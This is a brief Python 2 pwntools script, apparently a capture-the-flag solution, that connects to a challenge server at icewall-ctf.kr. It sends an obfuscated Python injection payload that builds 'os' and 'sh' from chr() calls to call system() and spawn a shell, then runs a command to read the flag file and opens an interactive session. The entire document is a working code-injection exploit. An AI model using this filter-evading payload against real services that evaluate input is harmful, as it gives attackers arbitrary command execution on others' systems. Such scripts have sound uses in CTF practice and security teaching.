from pwn import *

p = remote("icewall-ctf.kr", 24005)
p.sendline("__import__(chr(111)+chr(115)).system(chr(115)+chr(104))")
print p.recv()
p.sendline("cat /*/*/flag")
print p.recv()
p.interactive()
